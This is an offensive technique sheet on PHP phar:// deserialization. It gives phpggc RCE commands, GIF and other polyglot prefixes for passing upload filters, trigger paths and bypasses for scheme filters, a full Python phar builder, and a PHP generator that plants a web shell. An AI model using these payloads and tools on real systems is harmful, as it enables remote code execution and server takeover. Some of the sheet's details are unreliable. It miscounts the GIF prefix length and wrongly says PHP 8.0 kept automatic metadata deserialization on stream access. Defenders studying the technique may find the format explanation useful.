---
title: "PHP phar:// - Deserialization Without a Call to unserialize()"
category: web
subcategory: php
type: technique
tags: [php, phar, phar-wrapper, deserialization, object-injection, unserialize, file-exists, getimagesize, polyglot, gif89a, stream-wrapper, upload, pop-chain, phpggc, magic-bytes]
difficulty: medium
summary: "Any filesystem function on a phar:// path unserializes the archive's manifest metadata -- object injection with no unserialize() in the source."
when_to_use:
  - "You can upload an arbitrary file AND a file path reaches file_exists/getimagesize/md5_file/include"
  - "The source has a POP chain but no reachable unserialize()"
  - "An LFI/file-read sink accepts a scheme (php://, zip://, phar://) instead of a plain path"
  - "An image/avatar/attachment upload with a content check you can satisfy with a polyglot"
tools: [phpggc, php, exiftool, burp]
related: [deser-php-object-injection, php-disable-functions-bypass, php-type-juggling]
---

## TL;DR

A `.phar` archive stores a serialized PHP value in its manifest metadata field. When PHP's phar
stream wrapper opens an archive -- which happens for *any* filesystem operation on a
`phar://` path, including `file_exists()` -- it calls `unserialize()` on that metadata. So an
upload plus a path-controlled stat call equals full PHP object injection, with no `unserialize()`
anywhere in the application source.

## Recognise it

- A sink that takes a path and does anything at all with it:
  `file_exists`, `is_file`, `is_dir`, `is_link`, `is_readable`, `is_writable`, `filesize`,
  `filemtime`, `filectime`, `fileatime`, `file_get_contents`, `file_put_contents`, `fopen`,
  `readfile`, `copy`, `rename`, `unlink`, `stat`, `lstat`, `touch`, `md5_file`, `sha1_file`,
  `hash_file`, `getimagesize`, `getimagesizefromstring` (no), `exif_read_data`, `mime_content_type`,
  `finfo::file`, `imagecreatefrom*`, `SplFileObject`, `SplFileInfo`, `DirectoryIterator`,
  `ZipArchive::open`, `parse_ini_file`, `simplexml_load_file`, `DOMDocument::load`,
  `include`/`require` (also executes the stub), `opendir`, `scandir`, `glob` (no, glob ignores wrappers).
- The path is user-influenced: `?file=`, `?avatar=`, `?template=`, an ImageMagick/thumbnail
  worker, an antivirus scan step, a "check the file exists" validation.
- You have *some* upload primitive: image upload, CSV import, backup restore, or even a
  temp file you can predict (`/tmp/php*`, session files `/var/lib/php/sessions/sess_<PHPSESSID>`).
- The app defines magic methods (`__destruct`, `__wakeup`, `__toString`) or ships a library
  `phpggc` knows.

## Theory

### Archive layout

```
+-------------------------------------------------------------+
| stub:      <?php ... __HALT_COMPILER(); ?>\r\n               |  executed on include()
+-------------------------------------------------------------+
| manifest:                                                    |
|   uint32 LE  manifest length (bytes AFTER this field)        |
|   uint32 LE  number of files                                 |
|   uint16 BE  api version (e.g. 0x1100 -> b"\x11\x00")        |
|   uint32 LE  global flags                                    |
|   uint32 LE  alias length | alias bytes                      |
|   uint32 LE  metadata length | serialize()d metadata   <-- THE BUG
|   per file:                                                  |
|     uint32 filename len | filename                           |
|     uint32 uncompressed size                                 |
|     uint32 unix timestamp                                    |
|     uint32 compressed size                                   |
|     uint32 crc32 of the uncompressed content                 |
|     uint32 flags (compression bits, permissions)             |
|     uint32 file-metadata len | file metadata (also unserialized)|
+-------------------------------------------------------------+
| contents: raw (or deflated) file data, in manifest order     |
+-------------------------------------------------------------+
| signature: hash over everything above                        |
|   uint32 LE signature type (1=MD5, 2=SHA1, 4=SHA256, 8=SHA512)|
|   "GBMB"  (the phar magic trailer)                           |
+-------------------------------------------------------------+
```

The stub only needs to contain `__HALT_COMPILER();` -- **everything before it is free-form**.
That is what makes polyglots possible: the first bytes can be a GIF/JPEG/PNG header, a ZIP
signature, a PDF header, or JSON, and the archive still parses.

### Why every stat call triggers it

`phar://` is a registered stream wrapper. `php_stream_url_stat` on a `phar://` URL must open and
parse the archive to answer questions about the inner file. Parsing means reading the manifest,
and reading the manifest means `phar_parse_metadata()` -> `unserialize()`. The object is
created, `__wakeup`/`__unserialize` runs, and when the request ends `__destruct` runs.
No call to `unserialize()` appears anywhere in the application.

### phar.readonly

`phar.readonly=1` (the default) only blocks *writing* phars from PHP. It does not block reading
them, and it does not affect you because you build the archive on your own machine. If you must
generate one on a box where it is set, either use `php -d phar.readonly=0`, or write the bytes
yourself (the Python builder below does exactly that, no PHP needed).

### Version notes

- The technique is universal from PHP 5.x onward.
- PHP 8.0 kept metadata deserialization; the practical hardening is configuration
  (`phar.readonly`, removing the wrapper with `stream_wrapper_unregister('phar')`, or an
  `open_basedir`/allowlist on the sink), plus auditing the sink itself.
- `Phar::getMetadata()` gained an options array in PHP 8.0 so *application* code can pass
  `['allowed_classes' => false]`, but the internal parse path that stat calls hit is what
  matters to you, and it is not something the application controls.
- Treat "does the target's PHP version still do this?" as a thing you test, not assume: a
  `phar://` path to a non-existent inner file that still throws a class-not-found style error
  is your oracle.

## Attack

1. **Build the POP chain** exactly as in `deser-php-object-injection`. The metadata is an
   ordinary serialized value, so any chain that works through `unserialize()` works here.
2. **Wrap it in a phar.**
   ```sh
   phpggc -p phar -o evil.phar Monolog/RCE1 system id
   phpggc -p phar -pp gif -o evil.gif Monolog/RCE1 system id     # polyglot prefix
   ```
3. **Make it pass the upload filter.** Prepend `GIF89a;` (8 bytes) so `getimagesize()` and
   most magic-byte checks accept it. `exiftool` can also stuff a serialized blob into a real
   JPEG comment, but the metadata field is cleaner.
4. **Find where it landed.** `/uploads/<hash>.gif`, `/tmp/phpXXXXXX`, a session file, or a
   path echoed back by the app.
5. **Trigger.** Point the path sink at `phar://` + the absolute path + `/anything`:
   ```
   ?file=phar:///var/www/uploads/evil.gif/x
   ?file=phar://./uploads/evil.gif/test.txt
   ?file=phar:///var/www/uploads/evil.gif      (inner path optional for stat calls)
   ```
   Relative paths work; the inner path does not have to exist for a stat call.
6. **If the scheme is filtered**, try `compress.zlib://phar://...`, `phar:/` (single slash is
   accepted by some builds), `PHAR://` (schemes are case-insensitive), or chain through
   another wrapper: `php://filter/read=convert.base64-encode/resource=phar://...`.

### Delivery without an upload endpoint

- **Session files.** `PHPSESSID=abc` writes `/var/lib/php/sessions/sess_abc`. If any session
  value is attacker-controlled you can smuggle phar bytes into it, then
  `phar:///var/lib/php/sessions/sess_abc/x`. NUL bytes survive session files.
- **Log files.** Poison `access.log` with a phar-shaped User-Agent (hard: needs exact binary).
- **`php://temp` / `/tmp/phpXXXXXX`.** Uploaded temp files exist for the duration of the
  request -- combine with a race or with `phpinfo()` leaking the temp name.
- **`/proc/self/fd/N`.** With an LFI and a held upload you can reach the temp file by fd.
- **A file you control inside a zip/tar the app extracts.**

## Code

Full phar builder in Python -- no PHP binary, no `phar.readonly` to fight.

```python
#!/usr/bin/env python3
"""Build a (polyglot) .phar whose manifest metadata is an arbitrary PHP
serialized payload, and parse one back to verify the layout.

The __main__ block builds an archive, re-parses its own output, and asserts
the manifest, the metadata, the content and the SHA-1 signature are all
consistent.
"""
from __future__ import annotations

import binascii
import hashlib
import struct
import sys

STUB = b"<?php __HALT_COMPILER(); ?>\r\n"

SIG_MD5, SIG_SHA1, SIG_SHA256, SIG_SHA512 = 1, 2, 4, 8
_SIG_HASH = {SIG_MD5: "md5", SIG_SHA1: "sha1",
             SIG_SHA256: "sha256", SIG_SHA512: "sha512"}

# Prefixes that make the archive also parse as an image / archive.
POLYGLOT_PREFIX = {
    "none": b"",
    "gif": b"GIF89a\x01\x00\x01\x00\x00\xff\x00,",
    "jpeg": b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00",
    "png": b"\x89PNG\r\n\x1a\n",
    "pdf": b"%PDF-1.4\n",
    "zip": b"PK\x03\x04",
    "bmp": b"BM",
}


def _u32(n: int) -> bytes:
    return struct.pack("<I", n)


def build_phar(metadata: bytes,
               files: dict[str, bytes] | None = None,
               alias: str = "",
               prefix: str = "none",
               sig_type: int = SIG_SHA1,
               api_version: bytes = b"\x11\x00",
               stub: bytes = STUB) -> bytes:
    """metadata is RAW PHP serialize() output (bytes)."""
    files = files or {"test.txt": b"phar\n"}

    entries = bytearray()
    contents = bytearray()
    for name, data in files.items():
        nb = name.encode()
        entries += _u32(len(nb)) + nb
        entries += _u32(len(data))          # uncompressed size
        entries += _u32(0)                  # timestamp
        entries += _u32(len(data))          # compressed size (== uncompressed)
        entries += _u32(binascii.crc32(data) & 0xFFFFFFFF)
        entries += _u32(0x1B6)              # flags: 0666 perms, no compression
        entries += _u32(0)                  # per-file metadata length
        contents += data

    ab = alias.encode()
    manifest_body = (
        _u32(len(files))
        + api_version
        + _u32(0)                           # global flags
        + _u32(len(ab)) + ab
        + _u32(len(metadata)) + metadata
        + bytes(entries)
    )
    manifest = _u32(len(manifest_body)) + manifest_body

    body = POLYGLOT_PREFIX[prefix] + stub + manifest + bytes(contents)
    digest = hashlib.new(_SIG_HASH[sig_type], body).digest()
    return body + digest + _u32(sig_type) + b"GBMB"


def parse_phar(blob: bytes) -> dict:
    """Minimal parser: locate the stub, read the manifest, verify the signature."""
    idx = blob.find(b"__HALT_COMPILER();")
    if idx < 0:
        raise ValueError("no __HALT_COMPILER() stub")
    p = idx + len(b"__HALT_COMPILER();")
    # PHP skips optional horizontal whitespace, an optional "?>", then at most
    # one newline sequence. Anything more and we would eat the manifest.
    while blob[p:p + 1] in (b" ", b"\t"):
        p += 1
    if blob[p:p + 2] == b"?>":
        p += 2
    if blob[p:p + 2] == b"\r\n":
        p += 2
    elif blob[p:p + 1] in (b"\n", b"\r"):
        p += 1
    start = p

    (man_len,) = struct.unpack("<I", blob[p:p + 4]); p += 4
    man_end = p + man_len
    (nfiles,) = struct.unpack("<I", blob[p:p + 4]); p += 4
    api = blob[p:p + 2]; p += 2
    (flags,) = struct.unpack("<I", blob[p:p + 4]); p += 4
    (alias_len,) = struct.unpack("<I", blob[p:p + 4]); p += 4
    alias = blob[p:p + alias_len].decode(); p += alias_len
    (meta_len,) = struct.unpack("<I", blob[p:p + 4]); p += 4
    metadata = blob[p:p + meta_len]; p += meta_len

    names = []
    for _ in range(nfiles):
        (nl,) = struct.unpack("<I", blob[p:p + 4]); p += 4
        names.append(blob[p:p + nl].decode()); p += nl
        # uncompressed size, timestamp, compressed size, crc32, flags
        p += 20
        (fm,) = struct.unpack("<I", blob[p:p + 4]); p += 4
        p += fm

    if p != man_end:
        raise ValueError("manifest length mismatch: %d != %d" % (p, man_end))

    trailer = blob[-8:]
    if trailer[4:] != b"GBMB":
        raise ValueError("missing GBMB magic")
    (sig_type,) = struct.unpack("<I", trailer[:4])
    hname = _SIG_HASH[sig_type]
    dlen = hashlib.new(hname).digest_size
    signed = blob[:-8 - dlen]
    stored = blob[-8 - dlen:-8]
    ok = hashlib.new(hname, signed).digest() == stored

    return {"stub_offset": idx, "manifest_offset": start, "manifest_len": man_len,
            "files": names, "alias": alias, "api": api, "flags": flags,
            "metadata": metadata, "sig_type": sig_type, "sig_ok": ok}


# --- payload helpers -------------------------------------------------------

def php_object(cls: str, props: dict[str, str]) -> bytes:
    """Serialize a flat PHP object with public string properties."""
    body = "".join('s:%d:"%s";s:%d:"%s";'
                   % (len(k), k, len(v), v) for k, v in props.items())
    return ('O:%d:"%s":%d:{%s}' % (len(cls), cls, len(props), body)).encode()


def triggers(path: str) -> list[str]:
    """Every phar:// spelling worth trying against a filtered sink."""
    return [
        "phar://" + path,
        "phar://" + path + "/x",
        "phar://./" + path.lstrip("/") + "/x",
        "PHAR://" + path + "/x",
        "phar:/" + path + "/x",
        "compress.zlib://phar://" + path + "/x",
        "php://filter/read=convert.base64-encode/resource=phar://" + path + "/x",
    ]


def main() -> int:
    if len(sys.argv) < 4:
        print("usage: %s <out.phar> <Class> <prop=value> [prop=value ...] "
              "[--prefix gif]" % sys.argv[0])
        return 1
    out, cls = sys.argv[1], sys.argv[2]
    prefix = "none"
    props: dict[str, str] = {}
    args = sys.argv[3:]
    while args:
        a = args.pop(0)
        if a == "--prefix":
            prefix = args.pop(0)
        else:
            k, _, v = a.partition("=")
            props[k] = v
    blob = build_phar(php_object(cls, props), prefix=prefix)
    with open(out, "wb") as fh:
        fh.write(blob)
    print("wrote %s (%d bytes, prefix=%s)" % (out, len(blob), prefix))
    for t in triggers("/var/www/uploads/" + out):
        print("  ", t)
    return 0


def _self_test() -> None:
    meta = php_object("Logger", {"file": "/var/www/s.php",
                                 "data": "<?php system($_GET[0]);"})
    assert meta.startswith(b'O:6:"Logger":2:{'), meta

    # plain phar round-trips
    blob = build_phar(meta, files={"a.txt": b"hello", "b.txt": b"world"})
    info = parse_phar(blob)
    assert info["files"] == ["a.txt", "b.txt"], info["files"]
    assert info["metadata"] == meta
    assert info["sig_ok"] is True
    assert info["sig_type"] == SIG_SHA1
    assert blob.endswith(b"GBMB")

    # every polyglot prefix still parses, and keeps its magic bytes
    for name, magic in POLYGLOT_PREFIX.items():
        b = build_phar(meta, prefix=name)
        assert b.startswith(magic), name
        i = parse_phar(b)
        assert i["metadata"] == meta and i["sig_ok"], name
        # the GIF prefix is what getimagesize() sniffs
        if name == "gif":
            assert b[:6] == b"GIF89a"

    # other signature algorithms
    for st in (SIG_MD5, SIG_SHA1, SIG_SHA256, SIG_SHA512):
        b = build_phar(meta, sig_type=st)
        i = parse_phar(b)
        assert i["sig_ok"] and i["sig_type"] == st, st

    # an alias is stored and read back
    b = build_phar(meta, alias="evil.phar")
    assert parse_phar(b)["alias"] == "evil.phar"

    # tampering breaks the signature
    bad = bytearray(build_phar(meta))
    bad[len(POLYGLOT_PREFIX["none"]) + len(STUB) + 40] ^= 0xFF
    assert parse_phar(bytes(bad))["sig_ok"] is False

    # manifest length field is authoritative -- a wrong one must be detected
    good = build_phar(meta)
    off = good.find(b"__HALT_COMPILER();") + len(b"__HALT_COMPILER();") + 5
    broken = bytearray(good)
    broken[off:off + 4] = struct.pack("<I", 9999)
    try:
        parse_phar(bytes(broken))
        raise AssertionError("expected a manifest length mismatch")
    except (ValueError, struct.error, IndexError):
        pass

    assert len(triggers("/x.gif")) == 7
    print("[ok] phar builder + parser verified for %d prefixes and %d signatures"
          % (len(POLYGLOT_PREFIX), 4))


if __name__ == "__main__":
    if len(sys.argv) > 1:
        raise SystemExit(main())
    _self_test()
```

PHP generator, when you do have a PHP binary:

```php
<?php
// php -d phar.readonly=0 gen.php
class Logger { public $file = '/var/www/html/s.php';
               public $data = '<?php system($_GET[0]); ?>'; }
@unlink('evil.phar');
$p = new Phar('evil.phar');
$p->startBuffering();
// GIF polyglot: the stub may be prefixed with anything
$p->setStub("GIF89a\x01\x00\x01\x00\x00\xff\x00,<?php __HALT_COMPILER(); ?>");
$p->setMetadata(new Logger());
$p->addFromString('test.txt', 'phar');
$p->stopBuffering();
rename('evil.phar', 'evil.gif');
echo "ok\n";
```

## Variants & pitfalls

- **`file_exists()` alone is enough.** You do not need a read primitive; you need a *path*.
- **Compression must match the flags.** If you set a compression bit but store raw bytes, PHP
  errors out before parsing metadata. The builder above stores everything uncompressed.
- **`getimagesize()` is not a real content check** -- it sniffs the first bytes. A GIF prefix
  costs 14 bytes. `finfo`/`mime_content_type` behave the same way.
- **Re-encoding kills you.** If the upload pipeline runs `imagecreatefromjpeg` + `imagejpeg`,
  the phar structure is destroyed. Look for a path that stores the original bytes.
- **`phar://` inside `include`/`require`** executes the *stub*, so the polyglot prefix must
  still be valid PHP context or you will get output before the code -- usually fine.
- **Windows paths** use `phar://C:/path/file.phar/x`.
- **`open_basedir`** restricts the outer path; the inner path is unconstrained.
- **`allow_url_include` is irrelevant** -- phar is a local wrapper.
- **Signature is optional.** PHP verifies it only when the archive declares one; an archive with
  no trailing `GBMB` block is still parsed. Keeping a valid signature avoids edge-case rejects.
- **Detection oracle**: `phar:///etc/passwd/x` -> "internal corruption of phar" vs
  `phar:///nonexistent/x` -> "unable to open" tells you the wrapper is enabled and reachable.
- **Metadata is not the only deserialization point** -- per-file metadata is unserialized too,
  which matters if a filter only strips the global metadata field.

## Tools

- `phpggc -p phar -pp gif -o evil.gif <Chain> <func> <arg>` -- one command for the whole thing.
- `php -d phar.readonly=0` with the `Phar` class for bespoke archives.
- `exiftool -Comment='<payload>' img.jpg` for metadata-based polyglots.
- `xxd`/`binwalk` to confirm the stub offset and the `GBMB` trailer.

## References

- Sam Thomas (Secarma) -- "It's a PHP unserialization vulnerability Jim, but not as we know it" (BlackHat USA 2018), the paper that introduced the technique.
- PHP manual -- Phar file format, phar stream wrapper, `phar.readonly`.
- ambionics/phpggc -- `-p phar` and `-pp` polyglot options.
